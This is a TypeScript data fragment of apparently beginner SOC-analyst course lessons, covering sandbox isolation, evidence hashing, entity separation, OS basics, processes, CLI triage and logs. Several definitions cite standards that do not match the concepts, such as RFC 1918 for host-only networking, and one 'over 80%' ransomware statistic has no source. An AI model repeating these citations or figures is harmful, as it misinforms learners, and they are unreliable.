          heading: 'Incident & Request Routing: Where Do Issues Go?',
          paragraph1:
            'When an operational request arrives, proper triage requires routing it to its respective domain: broken keyboards to Staff Support, password resets to Identity Services, network cable flapping to Network Services, and suspicious 03:00 AM logins to the SOC.',
          paragraph2:
            'Cooperation matters more than pretending one team knows everything. The security team investigates alerts with the asset owner help, maintaining clear communication across zones.',
          techBoxTitle: 'TECH BOX: Cross-Functional Ticket Dispatch [Details]',
          techBoxAnalogy:
            'Like an emergency dispatch 911 operator: a fire goes to firefighters, a burglary goes to police, and a gas leak goes to the utility company.',
          techBoxDef:
            'Cross-Functional Cooperation (CISA Incident Response Guide) governs the structured handoff between security operations and IT asset owners during incident triage.',
          techBoxWhy:
            'Accelerates mean-time-to-resolution (MTTR) by eliminating ticket misdirection and ensuring domain experts handle specialized tasks.',
          defaultAnimation: 'm00-cross-team-routing' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'route-tea-keyboard', label: 'KEYBOARD' },
            { id: 'route-pwd-reset', label: 'PASSWORD' },
            { id: 'route-port-flap', label: 'SWITCH' },
            { id: 'route-alert-3am', label: 'ALERT ▲' },
          ],
        },
      ];
    }

    // 3. M00-U2-C1: Your practice space
    if (chId === 'M00-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SANDBOX',
          subPillar: 'THE BLUE-BORDERED CONSOLE',
          heading: 'The Blue Console Frame: Your Visual Safety Boundary',
          paragraph1:
            'Mentor Ravi steps forward to introduce your practice workstation. As you look at the monitor, a distinct blue border surrounds the desktop. Nearby, an illustration of a locked heavy doorway represents production enterprise operations.',
          paragraph2:
            'Ravi explains the safety boundary: "Everything you touch in this course is a supplied simulation, training dataset, or explicitly authorized isolated lab." The blue border confirms safe sandbox space.',
          techBoxTitle: 'TECH BOX: Simulation Boundaries & Visual Confirmation [Details]',
          techBoxAnalogy:
            'Like a flight simulator cockpit: the switches, dials, and alarms look 100% authentic, but if you stall the engine, no real plane crashes.',
          techBoxDef:
            'Isolated Sandbox (NIST SP 800-86) is a controlled, segregated compute environment configured to prevent software execution from impacting production systems.',
          techBoxWhy:
            'Gives learners psychological safety to execute diagnostic tools and analyze malware samples without danger of impacting enterprise infrastructure.',
          defaultAnimation: 'm00-blue-border-console' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'border-blue', label: 'BLUE BORDER' },
            { id: 'border-desktop', label: 'WORKSTATION' },
            { id: 'border-red-door', label: 'LOCKED DOOR' },
            { id: 'border-safety-check', label: 'CHECK' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: ISOLATION',
          subPillar: 'VM ISOLATION & HOST-ONLY NETWORKING',
          heading: 'Virtual Machines: Why Isolation Settings Are Mandatory',
          paragraph1:
            'A Virtual Machine (VM) is a software computer running inside physical hardware. It feels like an independent PC with its own OS and files. However, a VM is not automatically a safety barrier if configured badly.',
          paragraph2:
            'If set to Bridged mode, a VM shares the physical network adapter, risking traffic leaks to campus Wi-Fi or production servers. Our labs enforce Host-Only networking, containing all traffic strictly within the simulation.',
          techBoxTitle: 'TECH BOX: Host-Only Virtual Switching & Packet Containment [Details]',
          techBoxAnalogy:
            'Like a submarine pressure chamber: closed valves prevent seawater from entering the living quarters; host-only mode closes the valve to external networks.',
          techBoxDef:
            'Host-Only Networking (RFC 1918) restricts virtual network communications exclusively between guest VMs and the local hypervisor, blocking external routing.',
          techBoxWhy:
            'Prevents network port scans or malicious test payloads from spilling across physical campus switches or triggering external security alarms.',
          defaultAnimation: 'm00-host-only-vm-isolation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'vm-hypervisor', label: 'HYPERVISOR' },
            { id: 'vm-sandbox', label: 'SANDBOX' },
            { id: 'vm-host-only', label: 'HOST-ONLY ✓' },
            { id: 'vm-bridged-danger', label: 'BRIDGED ✕' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: RECOVERY',
          subPillar: 'SNAPSHOT ROLLBACK & LAB SCOPE',
          heading: 'Snapshot Rollback: Instant Zero-Risk Recovery',
          paragraph1:
            'Before testing any command or opening a practice sample, the system records a clean snapshot baseline. If anything breaks or files become corrupted, a single reset restores the clean baseline in seconds.',
          paragraph2:
            'Ravi emphasizes the lab boundary rule: "May you point a lab exercise at your college network without permission? No. Permission for this lab does not include other systems. Stop and ask whenever the boundary is unclear."',
          techBoxTitle: 'TECH BOX: Golden Baseline Snapshots & Authorization Scope [Details]',
          techBoxAnalogy:
            'Like saving your progress in a video game before a difficult boss battle: if you make a mistake, you reload your clean checkpoint instantly.',
          techBoxDef:
            'Authorization Scope (ISO/IEC 27001) defines the documented, legal perimeter within which security testing or monitoring is permitted by leadership.',
          techBoxWhy:
            'Ensures learners master realistic troubleshooting with zero penalty, while instilling legal discipline regarding authorization boundaries.',
          defaultAnimation: 'm00-snapshot-rollback' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'snap-clean', label: 'CLEAN' },
            { id: 'snap-practice', label: 'PRACTICE' },
            { id: 'snap-revert', label: 'ROLLBACK' },
            { id: 'snap-scope', label: 'SCOPE' },
          ],
        },
      ];
    }

    // 4. M00-U2-C2: A clue worth preserving
    if (chId === 'M00-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: INTEGRITY',
          subPillar: 'ORIGINAL EVIDENCE INTEGRITY',
          heading: 'Never Tidy Originals: The Evidentiary Chain & SHA-256 Hashes',
          paragraph1:
            'Mentor Ananya brings up two files side-by-side: auth_raw.log and auth_working_copy.log. Ananya defines digital evidence: "Evidence is information another analyst can inspect, not just your memory of what happened."',
          paragraph2:
            'Never modify original evidence files to make them look tidier. Make originals read-only and generate a cryptographic SHA-256 hash immediately upon acquisition to mathematically prove zero tampering.',
          techBoxTitle: 'TECH BOX: Cryptographic Hashing & Evidence Integrity [Details]',
          techBoxAnalogy:
            'Like crime scene investigators bagging a physical clue: you place it in a sealed evidence bag with a tamper-evident seal; you never wipe away dust or polish it.',
          techBoxDef:
            'Evidence Integrity (NIST SP 800-86) ensures digital artifacts have not been altered, modified, or corrupted since initial collection, preserving legal admissibility.',
          techBoxWhy:
            'Editing or deleting messy lines from an original log file permanently destroys investigative validity and invalidates case findings in formal reviews.',
          defaultAnimation: 'm00-evidence-integrity-hash' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'evid-raw-log', label: 'RAW LOG' },
            { id: 'evid-read-only', label: 'LOCKED' },
            { id: 'evid-hash', label: 'SHA-256' },
            { id: 'evid-chain', label: 'AUDIT TRAIL' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: COPIES',
          subPillar: 'WORKING DUPLICATES & DOCKET NOTES',
          heading: 'Work Strictly on Copies: The Working Duplicate Strategy',
          paragraph1:
            'To preserve evidence integrity, analysts follow the working copy doctrine: duplicate the master log into auth_working_copy.log. Search, filter, highlight, and parse observables exclusively within the working duplicate.',
          paragraph2:
            'Always record collection metadata: who collected the file, from which host (BLR-BR-WS-04), at what exact time, and under what specific time zone (UTC or IST). Maintain a detailed sequential logbook of all actions.',
          techBoxTitle: 'TECH BOX: Working Duplicates & Collection Metadata [Details]',
          techBoxAnalogy:
            'Like a historian examining an ancient papyrus scroll: the original stays in a temperature-controlled vault, while scholars work on high-resolution photographs.',
          techBoxDef:
            'Working Copy (ISO/IEC 27037) is an exact bit-stream duplicate of digital evidence used for analysis to ensure the master source remains permanently pristine.',
          techBoxWhy:
            'Allows analysts to run aggressive text filters, regular expressions, and parsing scripts without any danger of modifying source evidence.',
          defaultAnimation: 'm00-working-copy-audit' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'copy-master', label: 'MASTER' },
            { id: 'copy-duplicate', label: 'WORKING COPY' },
            { id: 'copy-metadata', label: 'METADATA' },
            { id: 'copy-logbook', label: 'LOGBOOK' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: PAUSE',
          subPillar: 'THE SAFE PAUSE PROTOCOL',
          heading: 'The Safe Pause: A Safe Pause Beats an Irreversible Guess',
          paragraph1:
            'Ananya poses a critical scenario: "If an unfamiliar instruction or script might delete data, what comes next?" The only safe response is: "Pause, record what I see on screen, and contact the mentor."',
          paragraph2:
            'A safe pause is always better than an irreversible guess. Stop interaction, capture visible error codes and command flags, and escalate to senior leads for verified guidance.',
          techBoxTitle: 'TECH BOX: The Safe Pause Protocol (CDAC-SOP-EVID-02) [Details]',
          techBoxAnalogy:
            'Like a railway signal turning red when a switch malfunction occurs: the train comes to a controlled stop immediately rather than guessing which track is clear.',
          techBoxDef:
            'Safe Pause (CDAC-SOP-EVID-02) is the operational requirement to freeze execution, record observables, and consult senior leads when facing potential data loss.',
          techBoxWhy:
            'Prevents catastrophic analyst-induced outages, preserves volatile memory evidence, and protects junior analysts from taking unverified risks.',
          defaultAnimation: 'm00-safe-pause-protocol' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pause-trigger', label: 'RISK PROMPT' },
            { id: 'pause-halt', label: 'PAUSE' },
            { id: 'pause-record', label: 'DOCUMENT' },
            { id: 'pause-consult', label: 'CONSULT' },
          ],
        },
      ];
    }

    // 5. M00-U3-C1: The service we will follow
    if (chId === 'M00-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SCENARIO',
          subPillar: 'BRANCH FINANCE SUPPORT CONTEXT',
          heading: 'Our Recurring Scenario: Branch Finance Support Service',
          paragraph1:
            'Our course does not present disconnected, random alert puzzles. Instead, we follow a single, coherent business environment across multiple releases of evidence: the fictional Branch Finance Support service.',
          paragraph2:
            'This service supports daily branch operations: staff accounting portals, vendor invoices, customer requisitions, and shared document repositories. All systems emit continuous security telemetry into our central SIEM.',
          techBoxTitle: 'TECH BOX: Consistent Business Scenario Architecture [Details]',
          techBoxAnalogy:
            'Like a medical drama following a patient across multiple hospital departments: seeing the same case through triage, lab scans, and surgery provides complete contextual depth.',
          techBoxDef:
            'Recurring Incident Scenario provides an unbroken narrative arc connecting host artifacts, network wire captures, SIEM queries, and final incident handovers.',
          techBoxWhy:
            'Builds holistic investigative intuition by showing how a single enterprise compromise manifests across endpoints, firewalls, Active Directory, and log pipelines.',
          defaultAnimation: 'm00-branch-finance-service' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'svc-overview', label: 'SERVICE' },
            { id: 'svc-portal', label: 'PORTAL' },
            { id: 'svc-shared-docs', label: 'DOCUMENTS' },
            { id: 'svc-telemetry', label: 'TELEMETRY' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: ENTITIES',
          subPillar: 'ENTITY SEPARATION DOCTRINE',
          heading: 'Entity Separation: Account vs Workstation vs IP vs Human',
          paragraph1:
            'In security operations, confusion between devices, accounts, and human users causes catastrophic investigative errors. Ananya breaks down the four distinct entities: Business Service, User Account (FIN-OPS-01), Workstation (BLR-BR-WS-04), and Network IP (10.10.20.15).',
          paragraph2:
            'Is FIN-OPS-01 the computer name? No. It is an account label. The workstation is a separate silicon entity, and an account credential does not prove who was physically typing at the keyboard.',
          techBoxTitle: 'TECH BOX: Entity Resolution & Identifier Disambiguation [Details]',
          techBoxAnalogy:
            'Like an automobile: the driver (Human) uses a car key (Account) to start the Toyota sedan (Host) which has a temporary parking space permit (IP Address).',
          techBoxDef:
            'Entity Resolution (NIST SP 800-137) is the forensic process of disambiguating discrete digital identifiers into their corresponding real-world assets.',
          techBoxWhy:
            'Prevents analysts from confusing temporary IP leases with permanent hostnames, or blaming an employee whose password was stolen by an external threat actor.',
          defaultAnimation: 'm00-entity-separation-grid' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ent-account', label: 'ACCOUNT' },
            { id: 'ent-host', label: 'HOST' },
            { id: 'ent-ip', label: 'IP ADDRESS' },
            { id: 'ent-human', label: 'HUMAN' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: OBSERVABLES',
          subPillar: 'FACTS VS SPECULATIVE LEAPS',
          heading: 'Forensic Restraint: Disciplined Observables vs Speculation',
          paragraph1:
            'If an alert records that account FIN-OPS-01 authenticated at 02:14 AM from host BLR-BR-WS-04, a disciplined analyst writes: "Logon recorded under account FIN-OPS-01 on endpoint BLR-BR-WS-04." They do NOT write: "Sharma sat at the desk to steal files."',
          paragraph2:
            'Never make speculative leaps without physical evidence. Corroborate digital observables with physical badge swipe records and proxy logs before drawing human conclusions.',
          techBoxTitle: 'TECH BOX: Evidentiary Standards & Factual Reporting [Details]',
          techBoxAnalogy:
            'Like a judge in a court of law: the judge admits fingerprint records and security camera footage; they reject subjective theories and emotional guesses.',
          techBoxDef:
            'Disciplined Observable Reporting requires recording observable system indicators exactly as logged by the kernel, excluding speculation from forensic incident notes.',
          techBoxWhy:
            'Protects innocent staff from false accusations, prevents investigation bias, and ensures case dockets hold up under rigorous legal and administrative scrutiny.',
          defaultAnimation: 'm00-disciplined-observables' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'obs-raw-event', label: 'RAW EVENT' },
            { id: 'obs-disciplined', label: 'FACTS ✓' },
            { id: 'obs-speculation', label: 'SPECULATION ✕' },
            { id: 'obs-verification', label: 'VERIFY' },
          ],
        },
      ];
    }

    // 6. M00-U3-C2: The route from beginner to L1
    if (chId === 'M00-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ROADMAP',
          subPillar: '15-MODULE CURRICULUM PIPELINE',
          heading: 'The Grand Learning Route: From Complete Beginner to L1',
          paragraph1:
            'Mentor Ananya illuminates the full roadmap across 15 modules: Computers (M01) ➔ Networks (M02) ➔ Security Fundamentals (M03) ➔ Alert Triage (M04) ➔ SIEM Search (M05) ➔ Log Analysis (M06) ➔ Host & Network Monitoring (M07-M08) ➔ EDR & Ecosystems (M09-M10) ➔ Identity & Threat Intel (M11) ➔ Automation & ATT&CK (M12-M13) ➔ Incident Handover (M14).',
          paragraph2:
            'Each module builds upon the previous one, transitioning you systematically from foundational hardware and packet basics to advanced threat correlation and executive case briefings.',
          techBoxTitle: 'TECH BOX: Scaffolded 15-Module Curriculum Pipeline [Details]',
          techBoxAnalogy:
            'Like a martial arts progression: white belt covers balance and stances (M01-M03); intermediate belts cover sparring (M04-M10); black belt covers tournament defense (M11-M14).',
          techBoxDef:
            'Curriculum Progression Pipeline (NIST NICE Framework) maps structured competency milestones from basic technical comprehension to autonomous SOC operations.',
          techBoxWhy:
            'Provides learners with a crystal-clear sense of direction, milestone achievements, and verifiable skill progression.',
          defaultAnimation: 'm00-curriculum-roadmap-15' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'road-foundations', label: 'STAGE 1' },
            { id: 'road-triage-siem', label: 'STAGE 2' },
            { id: 'road-sensors', label: 'STAGE 3' },
            { id: 'road-capstone', label: 'STAGE 4' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: PEDAGOGY',
          subPillar: 'THE 4-SECTION CHAPTER ENGINE',
          heading: 'The 4-Section Learning Engine: A Consistent Daily Rhythm',
          paragraph1:
            'Every chapter in this course follows an active, predictable 4-section rhythm: Section 1 (Theory Briefing with mentors and real-world analogies), Section 2 (Animated Visual Story with vector HUDs), Section 3 (Interactive Activity with evidence sandboxes), and Section 4 (Scenario-based Knowledge Check).',
          paragraph2:
            'This multi-modal structure ensures complete retention: you read the concept, see the telemetry in motion, practice with interactive tools, and validate your instincts with instant feedback.',
          techBoxTitle: 'TECH BOX: Multi-Modal Active Learning Architecture [Details]',
          techBoxAnalogy:
            'Like learning a musical instrument: you read the sheet music (Theory), listen to the master play (Visual Story), practice the scales (Activity), and perform the song (Knowledge Check).',
          techBoxDef:
            'Pedagogical Rhythm combines theoretical framing, visual vector representation, interactive kinesthetic sandbox practice, and formative assessment in each module chapter.',
          techBoxWhy:
            'Maximizes retention and prevents cognitive overload by breaking complex technical concepts into four engaging, digestible phases.',
          defaultAnimation: 'm00-four-section-engine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'sec1-theory', label: 'THEORY' },
            { id: 'sec2-visual', label: 'VISUAL' },
            { id: 'sec3-activity', label: 'ACTIVITY' },
            { id: 'sec4-check', label: 'QUIZ' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: READINESS',
          subPillar: 'FADING SCAFFOLDING & L1 PRACTICE',
          heading: 'Fading Scaffolding: Your Path to Supervised L1 Practice',
          paragraph1:
            'When will you work without mentors explaining every click? Ananya explains how scaffolding works: "Support gradually reduces. By Module 14, you will triage alerts, document 5 Ws, and escalate incidents smoothly using real SOC playbooks."',
          paragraph2:
            'Your destination is evidence-based beginner L1 practice—not instant perfection, but trustworthy, disciplined analytical rigor. Workplace authorization and external certifications are separate formal steps.',
          techBoxTitle: 'TECH BOX: Pedagogical Scaffolding & Supervised L1 Competency [Details]',
          techBoxAnalogy:
            'Like learning to ride a bicycle: training wheels provide complete balance initially; as muscle memory builds, the training wheels come off and you ride independently.',
          techBoxDef:
            'Pedagogical Scaffolding (CDAC-L1-COMPETENCY-01) systematically tapers off hints and prompts as learner competence increases toward autonomous playbook execution.',
          techBoxWhy:
            'Prepares learners to step confidently onto a live SOC operations floor, able to follow supervisor playbooks and communicate case facts with professional precision.',
          defaultAnimation: 'm00-fading-scaffolding-l1' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'scaf-initial', label: 'GUIDED' },
            { id: 'scaf-fading', label: 'FADING' },
            { id: 'scaf-autonomous', label: 'L1 READY' },
            { id: 'scaf-destination', label: 'MISSION' },
          ],
        },
      ];
    }

    // 1. M01-U1-C1: Hardware, OS and accounts
    if (chId === 'M01-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: HARDWARE',
          subPillar: 'MOTHERBOARD & COOPERATING PARTS',
          heading: 'Physical Hardware: CPU, Memory, Storage & I/O',
          paragraph1:
            'Mentor Ravi sits beside you at the branch finance desk: "Think of the computer as cooperating parts: processor, volatile memory, persistent storage, and devices for input and output."',
          paragraph2:
            'Memory (RAM) supports your current active work and evaporates when power is turned off; persistent storage (SSD) keeps documents and logs safely saved across restarts. The processor (CPU) executes calculations billions of times per second.',
          techBoxTitle: 'TECH BOX: Memory vs Storage & Hardware Architecture [Details]',
          techBoxAnalogy: 'RAM is like your open physical desk where active documents lay open; SSD is like the locked metal filing cabinet across the room where files are archived permanently.',
          techBoxDef: 'Computer Hardware comprises physical silicon processors (CPU), ephemeral working memory (RAM), non-volatile magnetic or solid-state storage (SSD/HDD), and peripheral controllers.',
          techBoxWhy: 'Security analysts must know whether volatile malware code resides only in volatile RAM (disappearing upon reboot) or has established persistent files on disk to survive restarts.',
          defaultAnimation: 'm01-hardware-bus' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'hw-cpu', label: 'CPU' },
            { id: 'hw-ram', label: 'RAM' },
            { id: 'hw-ssd', label: 'SSD' },
            { id: 'hw-io', label: 'I/O' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: ARCHITECTURE',
          subPillar: 'OS COORDINATOR & KERNEL BRIDGE',
          heading: 'The Operating System: Master Coordinator',
          paragraph1:
            'Raw silicon cannot run enterprise applications on its own. The Operating System (such as Windows or Linux) serves as the master software coordinator bridging user applications and physical chips.',
          paragraph2:
            'The inner core of the OS—the Kernel (Ring 0)—manages device drivers, divides CPU time between processes, and isolates memory so a frozen browser cannot crash the workstation or overwrite financial records.',
          techBoxTitle: 'TECH BOX: OS Kernel & System Calls [Details]',
          techBoxAnalogy: 'The Kernel is like an air traffic controller directing flights on airport runways; user applications cannot touch the runway directly without formal clearance.',
          techBoxDef: 'The OS Kernel is the core privileged program operating in Ring 0 with unrestricted hardware access, arbitrating CPU scheduling, memory management, and security system calls (SYSCALLs).',
          techBoxWhy: 'Rootkits and advanced malware attempt to compromise the kernel because Kernel Mode gives complete visibility and the power to blind security sensors without detection.',
          defaultAnimation: 'm01-os-kernel' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'kern-apps', label: 'APPS (Ring 3)' },
            { id: 'kern-coord', label: 'KERNEL' },
            { id: 'kern-hw', label: 'HARDWARE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: DEFENSE',
          subPillar: 'LEAST PRIVILEGE BOUNDARY',
          heading: 'User Accounts & Least Privilege Barrier',
          paragraph1:
            'The operating system creates User Accounts to establish identity boundaries: standard user accounts for everyday office work (FIN-OPS-01), and administrative accounts for system maintenance.',
          paragraph2:
            'The Principle of Least Privilege (PoLP) requires that users operate with the minimum permissions needed for their daily tasks. If a standard user accidentally runs malware, the damage is contained—it cannot overwrite C:\\Windows\\System32.',
          techBoxTitle: 'TECH BOX: Least Privilege Doctrine & Account Isolation [Details]',
          techBoxAnalogy: 'Like hotel guests who receive keycards opening only their assigned bedroom, while only the hotel manager carries the master key opening maintenance electrical closets.',
          techBoxDef: 'Principle of Least Privilege (NIST SP 800-53 AC-6) dictates that user processes receive only the minimal access rights necessary, containing the blast radius of compromises.',
          techBoxWhy: 'Over 80% of enterprise ransomware attacks succeed only because regular office employees were erroneously granted local administrator privileges.',
          defaultAnimation: 'm01-account-privilege' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'user-std', label: 'STANDARD' },
            { id: 'uac-gate', label: 'UAC GATE' },
            { id: 'user-admin', label: 'ADMIN' },
          ],
        },
      ];
    }

    // 2. M01-U1-C2: Files, processes and memory
    if (chId === 'M01-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: FILESYSTEM',
          subPillar: 'DIRECTORY PATHS & ACCESS LISTS',
          heading: 'Filesystems, Paths & Protected Directories',
          paragraph1:
            'Mentor Ravi explains how the filesystem organizes data into a hierarchical tree of paths: from system volumes (C:\\) to protected OS directories (C:\\Windows\\System32) and personal user workspaces.',
          paragraph2:
            'Access Control Lists (ACLs) govern who can read, modify, or execute files. While standard users have full control inside their personal profile, critical system paths are strictly write-protected.',
          techBoxTitle: 'TECH BOX: NTFS Permissions & Critical File Paths [Details]',
          techBoxAnalogy: 'Like an office building where the public lobby is accessible to all, private desks belong to individuals, but the server electrical room requires biometric access.',
          techBoxDef: 'Filesystem Paths uniquely identify file locations on storage. Access Control Lists enforce file permissions to prevent unauthorized tampering with system binaries.',
          techBoxWhy: 'Adversaries look for world-writable directories (like C:\\Users\\Public or C:\\Windows\\Temp) to drop malicious payloads when blocked from System32.',
          defaultAnimation: 'm01-filesystem-tree' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'fs-sys32', label: 'SYSTEM32' },
            { id: 'fs-prog', label: 'PROGRAMS' },
            { id: 'fs-user', label: 'USER PROFILE' },
            { id: 'fs-public', label: 'PUBLIC (RISK)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: PROCESSES',
          subPillar: 'PID LIFECYCLE & PARENT TREES',
          heading: 'Running Processes & Process ID (PID) Tracking',
          paragraph1:
            'A program is dormant code stored on a disk; a process is that program brought to life in memory. When launched, the OS assigns a unique Process Identifier (PID) and records its parent (PPID).',
          paragraph2:
            'Processes run in their own memory space and execute threads. Analysts track parent-child relationships to spot anomalies—such as Microsoft Word spawning a PowerShell interpreter.',
          techBoxTitle: 'TECH BOX: Process Tree & Lifecycle Tracking [Details]',
          techBoxAnalogy: 'A recipe book resting on a shelf is a program; the chef actively cooking in the kitchen following that recipe is a running process.',
          techBoxDef: 'A Process is an instance of a computer program being executed by one or many threads. Process trees trace execution heritage from parent to child.',
          techBoxWhy: 'Adversaries abuse legitimate administrative utilities (LOLBINs). Identifying the parent process is how L1 analysts distinguish legitimate admin scripts from malicious triggers.',
          defaultAnimation: 'm01-process-lifecycle' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'proc-services', label: 'SERVICES' },
            { id: 'proc-svchost', label: 'SVCHOST' },
            { id: 'proc-explorer', label: 'EXPLORER' },
            { id: 'proc-cmd', label: 'CMD' },
            { id: 'proc-ps-lolbin', label: 'POWERSHELL ⚠️' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: MEMORY',
          subPillar: 'VIRTUAL MEMORY ISOLATION',
          heading: 'Virtual Memory & Address Space Isolation',
          paragraph1:
            'The OS provides every running process with its own private virtual memory sandbox. Process A (Excel) cannot directly read or overwrite the memory allocated to Process B (Chrome).',
          paragraph2:
            'Memory Management Units (MMU) translate virtual memory addresses to physical RAM banks. This memory isolation guarantees stability and stops malware from scraping passwords out of memory.',
          techBoxTitle: 'TECH BOX: Virtual Memory & Page Protection [Details]',
          techBoxAnalogy: 'Like separate cubicles in a call center: each agent has their own desk and notes and cannot look over the divider to read their neighbor\'s screen.',
          techBoxDef: 'Virtual Memory creates an abstraction over physical RAM, providing contiguous private address spaces with hardware-enforced isolation between user processes.',
          techBoxWhy: 'Process injection techniques (like DLL injection or process hollowing) attempt to break memory isolation to hide malicious code inside trusted system processes.',
          defaultAnimation: 'm01-memory-isolation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'mem-excel', label: 'EXCEL SANDBOX' },
            { id: 'mem-mmu', label: 'MMU TRANSLATION' },
            { id: 'mem-chrome', label: 'CHROME SANDBOX' },
            { id: 'mem-barrier', label: 'BARRIER ⛔' },
          ],
        },
      ];
    }

    // 3. M01-U2-C1: Command-line navigation and basic tools
    if (chId === 'M01-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: TERMINAL',
          subPillar: 'CLI COMMAND INTERFACE',
          heading: 'Command-Line Navigation & Core System Tools',
          paragraph1:
            'Mentor Ravi introduces the command-line interface (CLI): "GUIs are comfortable, but terminals allow analysts to query processes, inspect paths, and automate triage with speed and precision."',
          paragraph2:
            'Basic commands like dir (list files), cd (change directory), tasklist (view running processes), and whoami (check privileges) give instant visibility into host activity.',
          techBoxTitle: 'TECH BOX: CLI Navigation & Triage Commands [Details]',
          techBoxAnalogy: 'A graphical desktop is like ordering from a restaurant menu with pictures; the command line is like talking directly to the master chef in the kitchen.',
          techBoxDef: 'Command-Line Interface (CLI) accepts text commands to execute system utilities, automate forensic data gathering, and query hardware states without UI latency.',
          techBoxWhy: 'Many enterprise servers run "headless" without a graphical desktop. SOC analysts must be fluent in CLI commands to investigate incidents over remote shells.',
          defaultAnimation: 'm01-terminal-cli' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cli-tasklist', label: 'TASKLIST' },
            { id: 'cli-dir', label: 'DIR' },
            { id: 'cli-whoami', label: 'WHOAMI' },
            { id: 'cli-ipconfig', label: 'IPCONFIG' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: PROCESS TRIAGE',
          subPillar: 'INSPECTING RUNNING TASKS',
          heading: 'Process Inspection & Task Auditing',
          paragraph1:
            'Using commands like tasklist /v and Get-Process, analysts inspect running executables, their memory footprint, and which user account launched them.',
          paragraph2:
            'Verifying image path and user context reveals whether a process is legitimate software or a rogue script masquerading under a familiar name.',
          techBoxTitle: 'TECH BOX: Process Auditing via CLI [Details]',
          techBoxAnalogy: 'Like a security guard checking employee ID badges at the door to verify their department and authorization level.',
          techBoxDef: 'Process Auditing evaluates running task metadata, parentage, image path, and account credentials to detect unapproved or masquerading processes.',
          techBoxWhy: 'Adversaries often name malicious binaries "svchost.exe" or "update.exe" in non-standard paths. CLI triage reveals the true execution directory.',
          defaultAnimation: 'm01-process-triage-hud' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'triage-explorer', label: 'EXPLORER' },
            { id: 'triage-svchost', label: 'SVCHOST' },
            { id: 'triage-excel', label: 'EXCEL' },
            { id: 'triage-suspicious', label: 'POWERSHELL ⚠️' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: NETWORK TOOLS',
          subPillar: 'HOST SOCKETS & CONNECTIVITY',
          heading: 'Network Diagnostics: IP, Ports & Sockets',
          paragraph1:
            'Command-line utilities like ipconfig, ping, and netstat -ano reveal how the workstation connects to the wider enterprise network.',
          paragraph2:
            'Netstat maps which internal process ID is communicating over which port to external destinations, pinpointing active command-and-control beacons.',
          techBoxTitle: 'TECH BOX: Socket Mapping & Diagnostic Commands [Details]',
          techBoxAnalogy: 'Like an operator switchboard connecting physical room telephone extensions to outside caller lines.',
          techBoxDef: 'Socket Diagnostic Commands identify open TCP/UDP listening ports and map established foreign IP connections to local process IDs.',
          techBoxWhy: 'Connecting a network connection directly to a host PID bridges network telemetry with endpoint forensics during L1 incident triage.',
          defaultAnimation: 'm01-socket-diagnostics' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'sock-local', label: 'LOCAL SOCKET' },
            { id: 'sock-https', label: 'HTTPS (443)' },
            { id: 'sock-dns', label: 'DNS (53)' },
            { id: 'sock-c2-beacon', label: 'C2 BEACON ⚠️' },
          ],
        },
      ];
    }

    // 4. M01-U2-C2: Log file basics and where systems store records
    if (chId === 'M01-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: LOG ANATOMY',
          subPillar: 'DISSECTING SYSTEM RECORDS',
          heading: 'Anatomy of a Security Log Event',
          paragraph1:
            'Every significant computer action leaves a digital footprint called a log record. In Windows, these are stored in structured XML format within binary .evtx files.',
          paragraph2:
            'Key fields include: Timestamp (when), Event ID (what happened), Subject Account (who did it), Computer Name (where), and Status Codes (was it successful or denied?).',
          techBoxTitle: 'TECH BOX: Event Log Structure & Metadata [Details]',
          techBoxAnalogy: 'A security log is like a hotel entrance register book recording date, guest name, passport number, room assigned, and check-in time.',
          techBoxDef: 'A Log Event is a structured, timestamped audit record generated by the operating system recording authentication, process creation, or policy changes.',
          techBoxWhy: 'Logs provide the empirical ground truth for every security investigation. Without logs, analysts cannot prove an attack occurred.',
          defaultAnimation: 'm01-log-anatomy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'log-eventid', label: 'EVENT ID 4688' },
            { id: 'log-time', label: 'TIMESTAMP' },
